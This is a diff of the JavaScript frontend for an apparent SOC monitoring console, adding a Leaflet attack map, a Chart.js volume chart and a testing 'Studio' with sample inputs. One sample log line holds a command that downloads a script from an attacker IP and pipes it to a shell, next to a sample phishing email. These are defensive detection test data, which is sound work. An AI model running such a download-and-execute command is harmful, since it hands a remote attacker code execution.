@@ -1,12 +1,6 @@
 /**
- * SentiX SOC Console Frontend Application
- * Interacts with FastAPI backend to render:
- * - Live Alert Stream (Slide 11)
- * - AI Investigation Dossier (Slide 11)
- * - Global Attack Origin Map & Volume Chart (Slide 12)
- * - Automated Response Handlers (Slide 12)
- * - Autonomous Agent Mesh Pipeline (Slide 13)
- * - Action History - Containment Ledger (Slide 13)
+ * SentiX (SentinelX) SOC Console - High-Fidelity Tactical Frontend
+ * Implements Slides 11, 12, 13 + Live Multi-Agent Correlation Studio
  */
 
 let activeAlerts = [];
@@ -14,18 +8,22 @@ let selectedAlert = null;
 let currentSeverityFilter = "ALL";
 let isFeedPaused = false;
 let autoContainmentMode = false;
+let leafletMapInstance = null;
+let chartVolumeInstance = null;
 
 document.addEventListener("DOMContentLoaded", () => {
     initClock();
+    initNavigationTabs();
+    initLeafletAttackMap();
+    initChartJsVolume();
     loadDashboardStats();
     loadAlerts();
     loadAgentMesh();
     loadContainmentLedger();
     setupEventListeners();
-    initAttackMap();
-    initVolumeChart();
+    setupStudio();
 
-    // Polling loop for live telemetry every 5 seconds
+    // Telemetry polling loop every 5s
     setInterval(() => {
         if (!isFeedPaused) {
             loadDashboardStats();
@@ -55,32 +53,209 @@ function initClock() {
     setInterval(update, 1000);
 }
 
-/* Event Listeners */
+/* Nav Tabs Switcher */
+function initNavigationTabs() {
+    const tabs = document.querySelectorAll(".nav-tab-btn");
+    tabs.forEach(btn => {
+        btn.addEventListener("click", () => {
+            const targetId = btn.getAttribute("data-tab");
+            if (!targetId) return;
+
+            tabs.forEach(t => t.classList.remove("active"));
+            btn.classList.add("active");
+
+            document.querySelectorAll(".tab-pane").forEach(pane => {
+                pane.classList.remove("active");
+            });
+
+            const activePane = document.getElementById(targetId);
+            if (activePane) {
+                activePane.classList.add("active");
+            }
+
+            // Invalidate Leaflet map size on tab switch so it renders correctly
+            if (targetId === "pane-soc-console" && leafletMapInstance) {
+                setTimeout(() => leafletMapInstance.invalidateSize(), 150);
+            }
+        });
+    });
+}
+
+/* Leaflet Geolocation Map (Slide 12 Replica) */
+function initLeafletAttackMap() {
+    const mapEl = document.getElementById("leaflet-map");
+    if (!mapEl || typeof L === "undefined") return;
+
+    try {
+        leafletMapInstance = L.map("leaflet-map", {
+            center: [25.0, 10.0],
+            zoom: 2,
+            minZoom: 1,
+            maxZoom: 6,
+            zoomControl: true,
+            attributionControl: false
+        });
+
+        // Dark Matter Basemap Tiles
+        L.tileLayer("https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png", {
+            subdomains: "abcd",
+            maxZoom: 19
+        }).addTo(leafletMapInstance);
+
+        // Core Protected Asset (SOC Core-DB / Gateway)
+        const socTarget = [37.7749, -122.4194]; // San Francisco Gateway
+        const socIcon = L.divIcon({
+            className: "soc-pin-marker",
+            html: `<div style="width:14px;height:14px;border-radius:50%;background:#10b981;border:2px solid #fff;box-shadow:0 0 12px #10b981;"></div>`,
+            iconSize: [14, 14]
+        });
+        L.marker(socTarget, { icon: socIcon }).addTo(leafletMapInstance)
+            .bindPopup("<strong style='color:#10b981;'>Protected Asset</strong><br>10.0.4.10 (Core-DB / Edge Gateway)");
+
+        // 5 Active Threat Attack Vectors (matching Slide 12)
+        const attackVectors = [
+            { lat: 50.1109, lng: 8.6821, ip: "185.220.101.5", loc: "Frankfurt, Germany", type: "Spearphishing C2", sev: "CRITICAL" },
+            { lat: 31.2304, lng: 121.4737, ip: "203.175.188.1", loc: "Shanghai, China", type: "API Gateway RCE Exploit", sev: "CRITICAL" },
+            { lat: 55.7558, lng: 37.6173, ip: "45.154.255.88", loc: "Moscow, Russia", type: "SYN Flood / Auth Spike", sev: "HIGH" },
+            { lat: -33.8688, lng: 151.2093, ip: "103.224.182.9", loc: "Sydney, Australia", type: "Kerberoasting TGS Probe", sev: "CRITICAL" },
+            { lat: 37.3382, lng: -121.8863, ip: "198.51.100.22", loc: "San Jose, USA", type: "Subnet Recon Scan", sev: "MEDIUM" }
+        ];
+
+        attackVectors.forEach(v => {
+            const color = v.sev === "CRITICAL" ? "#ef4444" : "#f59e0b";
+            const attackIcon = L.divIcon({
+                className: "attack-pin-marker",
+                html: `<div style="width:12px;height:12px;border-radius:50%;background:${color};border:2px solid #fff;box-shadow:0 0 12px ${color};"></div>`,
+                iconSize: [12, 12]
+            });
+
+            L.marker([v.lat, v.lng], { icon: attackIcon }).addTo(leafletMapInstance)
+                .bindPopup(`<strong style="color:${color};">${v.type}</strong><br>IP: ${v.ip}<br>Location: ${v.loc}`);
+
+            // Draw line connecting origin to target SOC
+            const polyline = L.polyline([[v.lat, v.lng], socTarget], {
+                color: color,
+                weight: 1.5,
+                opacity: 0.6,
+                dashArray: "4, 6"
+            }).addTo(leafletMapInstance);
+        });
+    } catch (e) {
+        console.warn("Leaflet map initialization warning:", e);
+    }
+}
+
+/* Chart.js Detection Volume (60 Min) (Slide 12 Replica) */
+function initChartJsVolume() {
+    const canvas = document.getElementById("chartjs-volume-canvas");
+    if (!canvas || typeof Chart === "undefined") return;
+
+    try {
+        const ctx = canvas.getContext("2d");
+        const labels = ["07:01", "07:15", "07:31", "07:46", "08:01", "08:15", "08:30", "08:45", "09:00"];
+
+        // Gradient for Total Volume
+        const gradAmber = ctx.createLinearGradient(0, 0, 0, 200);
+        gradAmber.addColorStop(0, "rgba(245, 158, 11, 0.45)");
+        gradAmber.addColorStop(1, "rgba(245, 158, 11, 0.0)");
+
+        // Gradient for Critical Volume
+        const gradRed = ctx.createLinearGradient(0, 0, 0, 200);
+        gradRed.addColorStop(0, "rgba(239, 68, 68, 0.5)");
+        gradRed.addColorStop(1, "rgba(239, 68, 68, 0.0)");
+
+        chartVolumeInstance = new Chart(ctx, {
+            type: "line",
+            data: {
+                labels: labels,
+                datasets: [
+                    {
+                        label: "Total Detection Volume",
+                        data: [12, 15, 11, 14, 18, 22, 28, 31, 34],
+                        borderColor: "#f59e0b",
+                        backgroundColor: gradAmber,
+                        borderWidth: 2.5,
+                        fill: true,
+                        tension: 0.4,
+                        pointRadius: 3,
+                        pointBackgroundColor: "#fbbf24"
+                    },
+                    {
+                        label: "Critical / P1 Alerts",
+                        data: [5, 6, 4, 7, 9, 13, 17, 19, 21],
+                        borderColor: "#ef4444",
+                        backgroundColor: gradRed,
+                        borderWidth: 2.5,
+                        fill: true,
+                        tension: 0.4,
+                        pointRadius: 3,
+                        pointBackgroundColor: "#f87171"
+                    }
+                ]
+            },
+            options: {
+                responsive: true,
+                maintainAspectRatio: false,
+                plugins: {
+                    legend: {
+                        position: "top",
+                        labels: {
+                            color: "#94a3b8",
+                            font: { family: "JetBrains Mono", size: 10 }
+                        }
+                    },
+                    tooltip: {
+                        mode: "index",
+                        intersect: false,
+                        backgroundColor: "#0d1424",
+                        titleColor: "#38bdf8",
+                        bodyColor: "#f1f5f9",
+                        borderColor: "#233554",
+                        borderWidth: 1
+                    }
+                },
+                scales: {
+                    x: {
+                        grid: { color: "rgba(255, 255, 255, 0.04)" },
+                        ticks: { color: "#64748b", font: { family: "JetBrains Mono", size: 10 } }
+                    },
+                    y: {
+                        grid: { color: "rgba(255, 255, 255, 0.04)" },
+                        ticks: { color: "#64748b", font: { family: "JetBrains Mono", size: 10 } }
+                    }
+                }
+            }
+        });
+    } catch (e) {
+        console.warn("Chart.js volume graph initialization warning:", e);
+    }
+}
+
+/* Event Listeners Setup */
 function setupEventListeners() {
-    // Feed control pause/resume
+    // Feed control
     const feedBtn = document.getElementById("btn-feed-toggle");
     if (feedBtn) {
         feedBtn.addEventListener("click", () => {
             isFeedPaused = !isFeedPaused;
             feedBtn.innerHTML = isFeedPaused 
-                ? `<span class="icon">▶</span> RESUME FEED` 
-                : `<span class="icon">⏸</span> PAUSE FEED`;
-            feedBtn.style.color = isFeedPaused ? "#fbbf24" : "#e2e8f0";
+                ? `<span>▶</span> RESUME FEED` 
+                : `<span>⏸</span> PAUSE FEED`;
+            feedBtn.style.color = isFeedPaused ? "#fbbf24" : "#f8fafc";
         });
     }
 
     // Filter pills
-    const pills = document.querySelectorAll(".pill-btn");
-    pills.forEach(pill => {
+    document.querySelectorAll(".sev-pill").forEach(pill => {
         pill.addEventListener("click", (e) => {
-            pills.forEach(p => p.classList.remove("active"));
+            document.querySelectorAll(".sev-pill").forEach(p => p.classList.remove("active"));
             e.target.classList.add("active");
             currentSeverityFilter = e.target.getAttribute("data-sev");
             renderAlertList();
         });
     });
 
-    // Search bar
+    // Search input
     const searchInput = document.getElementById("search-alerts");
     if (searchInput) {
         searchInput.addEventListener("input", () => {
@@ -88,28 +263,29 @@ function setupEventListeners() {
         });
     }
 
-    // Mode Toggle (Manual / Auto)
-    const modeToggle = document.getElementById("mode-toggle-btn");
-    if (modeToggle) {
-        modeToggle.addEventListener("click", () => {
+    // Auto / Manual mode toggle (Slide 12)
+    const modeBtn = document.getElementById("mode-toggle-btn");
+    if (modeBtn) {
+        modeBtn.addEventListener("click", () => {
             autoContainmentMode = !autoContainmentMode;
-            modeToggle.textContent = autoContainmentMode ? "AUTO ON" : "AUTO OFF";
-            modeToggle.style.background = autoContainmentMode ? "rgba(16, 185, 129, 0.2)" : "rgba(239, 68, 68, 0.2)";
-            modeToggle.style.color = autoContainmentMode ? "#34d399" : "#fca5a5";
-            modeToggle.style.borderColor = autoContainmentMode ? "#10b981" : "#ef4444";
+            modeBtn.textContent = autoContainmentMode ? "AUTO ON" : "AUTO OFF";
+            modeBtn.style.background = autoContainmentMode ? "rgba(16, 185, 129, 0.2)" : "rgba(239, 68, 68, 0.2)";
+            modeBtn.style.color = autoContainmentMode ? "#34d399" : "#fca5a5";
+            modeBtn.style.borderColor = autoContainmentMode ? "#10b981" : "#ef4444";
+            showNotification(`Containment Mesh switched to ${autoContainmentMode ? 'AUTONOMOUS ACTIVE DEFENSE' : 'MANUAL CONFIRMATION'}`);
         });
     }
 
     // Action Handlers Test Execute
-    document.querySelectorAll(".btn-test-exec").forEach(btn => {
+    document.querySelectorAll(".btn-exec-action").forEach(btn => {
         btn.addEventListener("click", (e) => {
             const action = e.target.getAttribute("data-action");
             const target = e.target.getAttribute("data-target") || (selectedAlert ? selectedAlert.src_ip : "203.175.188.1");
-            executeAction(action, target, "MANUAL");
+            executeAction(action, target, autoContainmentMode ? "AUTO" : "MANUAL");
         });
     });
 
-    // Dossier quick action buttons
+    // Dossier actions
     const btnP1 = document.getElementById("btn-create-p1");
     if (btnP1) {
         btnP1.addEventListener("click", () => {
@@ -118,6 +294,7 @@ function setupEventListeners() {
             }
         });
     }
+
     const btnEdr = document.getElementById("btn-edr-isolate");
     if (btnEdr) {
         btnEdr.addEventListener("click", () => {
@@ -127,14 +304,30 @@ function setupEventListeners() {
         });
     }
 
+    // Export JSON Dossier
+    const btnExport = document.getElementById("btn-export-dossier");
+    if (btnExport) {
+        btnExport.addEventListener("click", () => {
+            if (!selectedAlert) return;
+            const blob = new Blob([JSON.stringify(selectedAlert, null, 2)], { type: "application/json" });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement("a");
+            a.href = url;
+            a.download = `SentiX-Dossier-${selectedAlert.id}.json`;
+            a.click();
+            URL.revokeObjectURL(url);
+            showNotification(`Investigation dossier exported for ${selectedAlert.id.substring(0, 8)}`);
+        });
+    }
+
     // Simulation Modal
-    const btnSim = document.getElementById("btn-open-sim");
+    const btnSimNav = document.getElementById("btn-open-sim");
     const modalSim = document.getElementById("sim-modal");
     const btnCloseModal = document.getElementById("btn-close-modal");
     const btnRunSim = document.getElementById("btn-run-sim-action");
 
-    if (btnSim && modalSim) {
-        btnSim.addEventListener("click", () => modalSim.classList.add("open"));
+    if (btnSimNav && modalSim) {
+        btnSimNav.addEventListener("click", () => modalSim.classList.add("open"));
     }
     if (btnCloseModal && modalSim) {
         btnCloseModal.addEventListener("click", () => modalSim.classList.remove("open"));
@@ -144,7 +337,7 @@ function setupEventListeners() {
     }
 }
 
-/* API Calls */
+/* API Calls & Renderers */
 async function loadDashboardStats() {
     try {
         const res = await fetch("/api/stats");
@@ -196,7 +389,7 @@ function renderAlertList() {
 
     listEl.innerHTML = "";
     if (filtered.length === 0) {
-        listEl.innerHTML = `<div style="padding:20px;text-align:center;color:#64748b;">No alerts matching criteria</div>`;
+        listEl.innerHTML = `<div style="padding:30px;text-align:center;color:#64748b;font-family:var(--font-mono);font-size:12px;">No alerts matching filter criteria</div>`;
         return;
     }
 
@@ -205,18 +398,18 @@ function renderAlertList() {
         const sevClass = alert.severity.toLowerCase();
         const isSelected = selectedAlert && selectedAlert.id === alert.id;
 
-        item.className = `alert-item ${sevClass} ${isSelected ? 'selected' : ''}`;
+        item.className = `alert-row-item ${sevClass} ${isSelected ? 'selected' : ''}`;
         item.innerHTML = `
-            <div class="alert-top">
-                <span class="badge-sev ${sevClass}">${alert.severity}</span>
-                <span class="alert-uuid">${alert.id.substring(0, 8)}...</span>
-                <span class="alert-time">${alert.timestamp}</span>
+            <div class="alert-header-meta">
+                <span class="pill-badge-sev ${sevClass}">${alert.severity}</span>
+                <span class="alert-id-mono">${alert.id.substring(0, 8)}...</span>
+                <span class="alert-time-tag">${alert.timestamp}</span>
             </div>
-            <div class="alert-title-text">${alert.title}</div>
-            <div class="alert-meta-row">
+            <div class="alert-headline">${alert.title}</div>
+            <div class="alert-footer-meta">
                 <span>Asset: ${alert.asset || alert.dest_ip || 'N/A'}</span>
                 <span>Src: ${alert.src_ip || 'N/A'}</span>
-                <span class="alert-risk-badge">risk ${alert.risk_score}</span>
+                <span class="risk-pill">risk ${alert.risk_score}</span>
             </div>
         `;
 
@@ -232,7 +425,7 @@ function selectAlert(alert) {
     selectedAlert = alert;
     renderAlertList();
 
-    // Populate Dossier
+    // Populate Investigation Dossier (Slide 11)
     document.getElementById("dossier-alert-id").textContent = alert.id;
     document.getElementById("dossier-cat-badge").textContent = alert.category || "PRIVILEGE ESCALATION";
     document.getElementById("dossier-title").textContent = alert.title;
@@ -242,7 +435,7 @@ function selectAlert(alert) {
     document.getElementById("meta-protocol").textContent = alert.category === "EMAIL_THREAT" ? "SMTP / TLS" : "HTTPS / TCP";
     document.getElementById("meta-technique").textContent = alert.mitre_technique || "T1078 Valid Accounts";
 
-    // Progress bars
+    // Dynamic Risk Progress Bars
     const compositeBar = document.getElementById("bar-composite");
     const compositeVal = document.getElementById("val-composite");
     if (compositeBar && compositeVal) {
@@ -263,12 +456,12 @@ function selectAlert(alert) {
         confEl.textContent = `${alert.confidence || 99}%`;
     }
 
-    // Threat Intel
+    // Threat Intel feeds
     document.getElementById("intel-vt").textContent = alert.vt_score || "8/72";
     document.getElementById("intel-abuse").textContent = alert.abuse_score || "34% (Suspicious)";
     document.getElementById("intel-otx").textContent = `${alert.otx_matches || 14} Matches`;
 
-    // Evidence & Chain of Thought
+    // Parse Evidence & Chain-of-Thought
     let details = {};
     try {
         details = typeof alert.details_json === "string" ? JSON.parse(alert.details_json) : (alert.details_json || {});
@@ -279,24 +472,24 @@ function selectAlert(alert) {
     const cotContainer = document.getElementById("dossier-cot");
     if (cotContainer) {
         cotContainer.innerHTML = `
-            <div class="cot-step">
-                <span class="cot-step-icon">⚡</span>
-                <span><strong>Ingestion & Parsing:</strong> Telemetry captured across perimeter sensors & normalized to ELK schema.</span>
+            <div class="cot-line">
+                <span class="cot-bullet">⚡</span>
+                <span><strong>Ingestion & Normalization:</strong> Raw telemetry captured and mapped into standardized schema.</span>
             </div>
-            <div class="cot-step">
-                <span class="cot-step-icon">🛡</span>
-                <span><strong>Signature & ML Anomaly:</strong> Isolation Forest computed anomaly index: ${alert.if_score || 87}%. Autoencoder loss: ${alert.ae_score || 79}%.</span>
+            <div class="cot-line">
+                <span class="cot-bullet">🛡</span>
+                <span><strong>ML Anomaly Loss:</strong> Isolation Forest index: ${alert.if_score || 87}%. Autoencoder reconstruction error: ${alert.ae_score || 79}%.</span>
             </div>
-            <div class="cot-step">
-                <span class="cot-step-icon">🤖</span>
-                <span><strong>LLM Semantic Synthesis:</strong> ${details.evidence || 'Identified unauthorized authentication and privilege escalation attempt.'}</span>
+            <div class="cot-line">
+                <span class="cot-bullet">🤖</span>
+                <span><strong>LLM Chain-of-Thought:</strong> ${details.evidence || 'Identified unauthorized credentials interception and privilege escalation attempt.'}</span>
             </div>
         `;
     }
 
     const expEl = document.getElementById("dossier-explanation");
     if (expEl) {
-        expEl.textContent = details.narrative || `The entity ${alert.src_ip} initiated reconnaissance and exploited public-facing interfaces targeting internal asset ${alert.asset}. Immediate host containment and perimeter firewall blacklisting is recommended.`;
+        expEl.textContent = details.narrative || `Adversary ${alert.src_ip} executed targeted attack progression against crown jewel ${alert.asset}. The multi-agent correlation mesh recommends immediate perimeter isolation and credential invalidation.`;
     }
 }
 
@@ -311,18 +504,18 @@ async function loadAgentMesh() {
 
             agents.forEach(agent => {
                 const node = document.createElement("div");
-                node.className = "agent-node";
+                node.className = "agent-node-card";
                 const dotClass = agent.status.toLowerCase();
                 node.innerHTML = `
-                    <div class="agent-top-row">
-                        <span class="agent-id-name">${agent.name}</span>
-                        <span class="agent-status-pill">
-                            <span class="status-dot ${dotClass}"></span>
+                    <div class="node-row-top">
+                        <span class="node-name">${agent.name}</span>
+                        <span class="node-status-tag">
+                            <span class="node-dot ${dotClass}"></span>
                             ${agent.status}
                         </span>
                     </div>
-                    <div class="agent-role">${agent.role}</div>
-                    <div class="agent-metrics-row">
+                    <div class="node-role-desc">${agent.role}</div>
+                    <div class="node-metrics">
                         <span>Load: ${agent.load_pct}%</span>
                         <span>Latency: ${agent.latency_ms}ms</span>
                     </div>
@@ -353,10 +546,10 @@ async function loadContainmentLedger() {
 
                 tr.innerHTML = `
                     <td>${entry.timestamp}</td>
-                    <td><strong>${entry.action}</strong></td>
-                    <td style="color:#f1f5f9;">${entry.target}</td>
+                    <td><strong style="color:#ffffff;">${entry.action}</strong></td>
+                    <td style="color:#38bdf8;font-weight:600;">${entry.target}</td>
                     <td style="color:${sevColor};font-weight:700;">${entry.severity}</td>
-                    <td style="color:${modeColor};">${entry.mode}</td>
+                    <td style="color:${modeColor};font-weight:700;">${entry.mode}</td>
                     <td>${entry.executed_by}</td>
                 `;
                 tbody.appendChild(tr);
@@ -384,7 +577,7 @@ async function executeAction(actionType, target, mode = "MANUAL") {
             const data = await res.json();
             loadContainmentLedger();
             loadDashboardStats();
-            showNotification(`Action ${data.action} executed against ${data.target}`);
+            showNotification(`Orchestrated Action [${data.action}] executed against [${data.target}]`);
         }
     } catch (err) {
         console.error("Action execution error:", err);
@@ -395,7 +588,7 @@ async function triggerAttackSimulation() {
     const btn = document.getElementById("btn-run-sim-action");
     if (btn) {
         btn.disabled = true;
-        btn.textContent = "EXECUTING SIMULATION PIPELINE...";
+        btn.textContent = "EXECUTING COLD APT SIMULATION...";
     }
     try {
         const res = await fetch("/api/simulation/run", { method: "POST" });
@@ -405,7 +598,7 @@ async function triggerAttackSimulation() {
             await loadDashboardStats();
             await loadContainmentLedger();
             document.getElementById("sim-modal")?.classList.remove("open");
-            showNotification(`Multi-Vector APT Intrusion Simulated: Cross-domain correlation completed & threats auto-contained!`);
+            showNotification(`Multi-Vector APT Intrusion Simulated: Correlation completed (Confidence 87%) & autonomous containment executed!`);
         }
     } catch (err) {
         console.error("Simulation error:", err);
@@ -417,200 +610,96 @@ async function triggerAttackSimulation() {
     }
 }
 
+/* Studio: Manual Dispatch & Testing */
+function setupStudio() {
+    const btnEmail = document.getElementById("btn-sample-email");
+    const btnLog = document.getElementById("btn-sample-log");
+    const btnIp = document.getElementById("btn-sample-ip");
+    const inputArea = document.getElementById("studio-input");
+    const btnSubmit = document.getElementById("btn-submit-studio");
+    const outputArea = document.getElementById("studio-output");
+
+    if (btnEmail && inputArea) {
+        btnEmail.addEventListener("click", () => {
+            inputArea.value = JSON.stringify({
+                task_type: "email",
+                sender: "payroll-alert@pay-support-portal.net",
+                subject: "CRITICAL: Urgent Payroll Account Verification Required Immediately",
+                headers: { "From": "HR Payroll", "Reply-To": "attacker-c2@185.220.101.5", "SPF": "SoftFail" },
+                body: "Urgent direct deposit verification required immediately: http://pay-support-portal.net/auth/verify?asset=10.0.4.10"
+            }, null, 2);
+        });
+    }
+
+    if (btnLog && inputArea) {
+        btnLog.addEventListener("click", () => {
+            inputArea.value = JSON.stringify({
+                task_type: "log",
+                entries: [
+                    "2026-08-07T18:28:10Z edge-gw sshd[4102]: Failed password for invalid user admin from 203.175.188.1 port 49152 ssh2",
+                    "2026-08-07T18:30:02Z edge-gw api-gateway[1029]: [CRITICAL] Memory heap corruption detected on /v1/auth/token handler (Buffer Overflow Canary Triggered) - SrcIP 203.175.188.1",
+                    "2026-08-07T18:31:45Z edge-gw sudo[5520]: user daemon : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c 'curl http://185.220.101.5/beacon.sh | sh'"
+                ]
+            }, null, 2);
+        });
+    }
+
+    if (btnIp && inputArea) {
+        btnIp.addEventListener("click", () => {
+            inputArea.value = JSON.stringify({
+                task_type: "ip_range",
+                range: "192.168.14.0/24"
+            }, null, 2);
+        });
+    }
+
+    if (btnSubmit && inputArea && outputArea) {
+        btnSubmit.addEventListener("click", async () => {
+            let parsed = {};
+            try {
+                parsed = JSON.parse(inputArea.value);
+            } catch (e) {
+                parsed = { text: inputArea.value };
+            }
+
+            btnSubmit.disabled = true;
+            btnSubmit.textContent = "DISPATCHING ACROSS AGENTS...";
+            try {
+                const res = await fetch("/api/dispatch", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(parsed)
+                });
+                const result = await res.json();
+                outputArea.textContent = JSON.stringify(result, null, 2);
+                loadAlerts(false);
+                loadDashboardStats();
+                showNotification(`Task dispatched successfully to ${result.routed_agent || 'domain agent'}`);
+            } catch (err) {
+                outputArea.textContent = `Error: ${err.message}`;
+            } finally {
+                btnSubmit.disabled = false;
+                btnSubmit.textContent = "RUN AGENT ANALYSIS";
+            }
+        });
+    }
+}
+
 function showNotification(msg) {
     const toast = document.createElement("div");
     toast.style.position = "fixed";
     toast.style.bottom = "24px";
     toast.style.right = "24px";
-    toast.style.background = "#1e293b";
+    toast.style.background = "#0e1628";
     toast.style.border = "1px solid #38bdf8";
-    toast.style.color = "#fff";
-    toast.style.padding = "12px 20px";
+    toast.style.color = "#ffffff";
+    toast.style.padding = "14px 20px";
     toast.style.borderRadius = "8px";
-    toast.style.boxShadow = "0 8px 24px rgba(0,0,0,0.5)";
+    toast.style.boxShadow = "0 10px 30px rgba(0,0,0,0.6)";
     toast.style.fontFamily = "'JetBrains Mono', monospace";
     toast.style.fontSize = "12px";
-    toast.style.zIndex = "1000";
-    toast.innerHTML = `🛡 <strong>SentiX Orchestrator:</strong> ${msg}`;
+    toast.style.zIndex = "3000";
+    toast.innerHTML = `<span style="color:#10b981;margin-right:8px;">✔</span><strong>SentiX Mesh:</strong> ${msg}`;
     document.body.appendChild(toast);
-    setTimeout(() => toast.remove(), 4000);
-}
-
-/* Canvas-based Geolocation Map (Slide 12) */
-function initAttackMap() {
-    const canvas = document.getElementById("attack-map-canvas");
-    if (!canvas) return;
-    const ctx = canvas.getContext("2d");
-
-    function resize() {
-        canvas.width = canvas.parentElement.clientWidth;
-        canvas.height = canvas.parentElement.clientHeight || 240;
-    }
-    resize();
-    window.addEventListener("resize", resize);
-
-    // Target SOC Node (e.g., North America / Central)
-    const target = { x: 0.28, y: 0.42, name: "Core SOC" };
-
-    // Threat Vectors (Origins around globe)
-    const origins = [
-        { x: 0.52, y: 0.35, name: "Frankfurt (185.220.101.5)", color: "#ef4444" },
-        { x: 0.78, y: 0.45, name: "East Asia (203.175.188.1)", color: "#f59e0b" },
-        { x: 0.65, y: 0.28, name: "Moscow (45.154.255.88)", color: "#ef4444" },
-        { x: 0.85, y: 0.78, name: "Sydney (103.224.182.9)", color: "#06b6d4" },
-        { x: 0.18, y: 0.38, name: "San Jose (198.51.100.22)", color: "#f59e0b" }
-    ];
-
-    let t = 0;
-    function draw() {
-        ctx.clearRect(0, 0, canvas.width, canvas.height);
-
-        // Draw simplified grid / world outline dots
-        ctx.fillStyle = "rgba(255, 255, 255, 0.05)";
-        for (let x = 20; x < canvas.width; x += 24) {
-            for (let y = 15; y < canvas.height; y += 24) {
-                ctx.fillRect(x, y, 2, 2);
-            }
-        }
-
-        const tx = canvas.width * target.x;
-        const ty = canvas.height * target.y;
-
-        // Draw target SOC node
-        ctx.beginPath();
-        ctx.arc(tx, ty, 6, 0, Math.PI * 2);
-        ctx.fillStyle = "#10b981";
-        ctx.fill();
-        ctx.strokeStyle = "rgba(16, 185, 129, 0.4)";
-        ctx.lineWidth = 4;
-        ctx.stroke();
-
-        // Draw attack vectors
-        origins.forEach((o, idx) => {
-            const ox = canvas.width * o.x;
-            const oy = canvas.height * o.y;
-
-            // Origin node
-            ctx.beginPath();
-            ctx.arc(ox, oy, 4, 0, Math.PI * 2);
-            ctx.fillStyle = o.color;
-            ctx.fill();
-
-            // Pulsing ring
-            const pulseR = 4 + (Math.sin(t * 0.05 + idx) + 1) * 4;
-            ctx.beginPath();
-            ctx.arc(ox, oy, pulseR, 0, Math.PI * 2);
-            ctx.strokeStyle = o.color;
-            ctx.lineWidth = 1;
-            ctx.stroke();
-
-            // Bezier curve to SOC
-            ctx.beginPath();
-            ctx.moveTo(ox, oy);
-            const cx = (ox + tx) / 2;
-            const cy = Math.min(oy, ty) - 30;
-            ctx.quadraticCurveTo(cx, cy, tx, ty);
-            ctx.strokeStyle = "rgba(239, 68, 68, 0.25)";
-            ctx.lineWidth = 1.5;
-            ctx.setLineDash([4, 4]);
-            ctx.stroke();
-            ctx.setLineDash([]);
-
-            // Moving particle
-            const progress = ((t * 0.015 + idx * 0.2) % 1);
-            const px = (1 - progress) * (1 - progress) * ox + 2 * (1 - progress) * progress * cx + progress * progress * tx;
-            const py = (1 - progress) * (1 - progress) * oy + 2 * (1 - progress) * progress * cy + progress * progress * ty;
-
-            ctx.beginPath();
-            ctx.arc(px, py, 2.5, 0, Math.PI * 2);
-            ctx.fillStyle = "#fff";
-            ctx.fill();
-        });
-
-        t += 1;
-        requestAnimationFrame(draw);
-    }
-    draw();
-}
-
-/* Detection Volume (60 Min) Canvas Chart (Slide 12) */
-function initVolumeChart() {
-    const canvas = document.getElementById("volume-chart-canvas");
-    if (!canvas) return;
-    const ctx = canvas.getContext("2d");
-
-    function resize() {
-        canvas.width = canvas.parentElement.clientWidth;
-        canvas.height = canvas.parentElement.clientHeight || 240;
-    }
-    resize();
-    window.addEventListener("resize", resize);
-
-    // Mock 60 min points matching Slide 12 (amber line total, red line critical)
-    const pointsTotal = [14, 15, 12, 11, 10, 9, 8, 9, 10, 12, 14, 17, 21, 25, 29, 31, 32];
-    const pointsCrit = [8, 9, 7, 6, 7, 7, 8, 7, 8, 9, 11, 14, 16, 18, 19, 19, 20];
-
-    function drawChart() {
-        ctx.clearRect(0, 0, canvas.width, canvas.height);
-        const w = canvas.width - 60;
-        const h = canvas.height - 40;
-        const startX = 40;
-        const startY = 15;
-
-        // Grid lines
-        ctx.strokeStyle = "rgba(255, 255, 255, 0.04)";
-        ctx.lineWidth = 1;
-        for (let i = 0; i <= 4; i++) {
-            const y = startY + (h / 4) * i;
-            ctx.beginPath();
-            ctx.moveTo(startX, y);
-            ctx.lineTo(startX + w, y);
-            ctx.stroke();
-
-            // Label
-            ctx.fillStyle = "#4b5563";
-            ctx.font = "10px JetBrains Mono";
-            ctx.fillText(String(32 - i * 8), 10, y + 3);
-        }
-
-        function drawCurve(data, strokeColor, fillColor) {
-            ctx.beginPath();
-            data.forEach((val, i) => {
-                const x = startX + (w / (data.length - 1)) * i;
-                const y = startY + h - (val / 35) * h;
-                if (i === 0) ctx.moveTo(x, y);
-                else {
-                    const prevX = startX + (w / (data.length - 1)) * (i - 1);
-                    const prevY = startY + h - (data[i - 1] / 35) * h;
-                    const cX = (prevX + x) / 2;
-                    ctx.bezierCurveTo(cX, prevY, cX, y, x, y);
-                }
-            });
-
-            ctx.strokeStyle = strokeColor;
-            ctx.lineWidth = 2.5;
-            ctx.stroke();
-
-            // Area fill
-            ctx.lineTo(startX + w, startY + h);
-            ctx.lineTo(startX, startY + h);
-            ctx.closePath();
-            ctx.fillStyle = fillColor;
-            ctx.fill();
-        }
-
-        // Draw Total Volume (Amber)
-        const gradAmber = ctx.createLinearGradient(0, startY, 0, startY + h);
-        gradAmber.addColorStop(0, "rgba(245, 158, 11, 0.25)");
-        gradAmber.addColorStop(1, "rgba(245, 158, 11, 0.0)");
-        drawCurve(pointsTotal, "#f59e0b", gradAmber);
-
-        // Draw Critical Volume (Red)
-        const gradRed = ctx.createLinearGradient(0, startY, 0, startY + h);
-        gradRed.addColorStop(0, "rgba(239, 68, 68, 0.3)");
-        gradRed.addColorStop(1, "rgba(239, 68, 68, 0.0)");
-        drawCurve(pointsCrit, "#ef4444", gradRed);
-    }
-
-    drawChart();
+    setTimeout(() => toast.remove(), 4200);
 }
